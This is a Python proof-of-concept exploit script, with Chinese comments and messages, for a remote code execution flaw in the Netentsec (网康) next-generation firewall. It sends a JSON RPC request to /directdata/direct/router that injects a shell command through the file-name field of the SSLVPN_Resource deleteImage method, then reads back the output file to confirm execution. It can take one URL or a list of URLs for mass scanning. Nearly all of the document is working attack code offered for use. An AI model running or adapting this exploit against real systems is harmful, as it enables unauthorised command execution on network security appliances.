#网康下一代防火墙 RCE
import urllib3
import sys
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def rce_url(url1):
    try:
        sess = requests.session()
        req = sess.post(url1,data,headers=head,timeout=2,verify=False)
        if req.status_code <= 210:
            new_url = url + poc
            req = requests.get(new_url,timeout=3,verify=False)
            print("[+]" + url + "  "  + req.text)
        else:
            pass
    except:
        print("请求超时！")
    sess.close()

def rce_urls(url2,new_url):
    try:
        req = requests.post(url2,data,headers=head,timeout=2,verify=False)
        if req.status_code <= 210:
            new_url = new_url + poc
            req = requests.get(new_url,timeout=3,verify=False)
            if req.status_code < 210:
                print("[+]" + new_url + " "  + req.text)
            else:
                print("[-]" + new_url + "  不存在rce!")
        else:
            pass
    except:
        pass

if __name__ == '__main__':
    try:
        print('------------------------------------------------------------')
        data = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;id > /var/www/html/test.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}'
        head = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/json'
        }
        payload = '/directdata/direct/router'
        poc = '/test.txt'
        url = sys.argv[1]
        if "http" in str(url):
            url1 = url + payload
            rce_url(url1)
        else:
            poc = '/test.txt'
            url2 = open(url,'r+')
            for i in url2:
                new_url = i.rstrip('\n')
                url2 = i.rstrip('\n') + payload
                rce_urls(url2,new_url)
    except FileNotFoundError:
        print("找不到该url文件！")
    except IndexError:
        print("网康下一代防火墙 RCE")
        print('------------------------------------------------------------')
        print("使用说明： python poc.py 单个url/url文件")
        print('------------------------------------------------------------')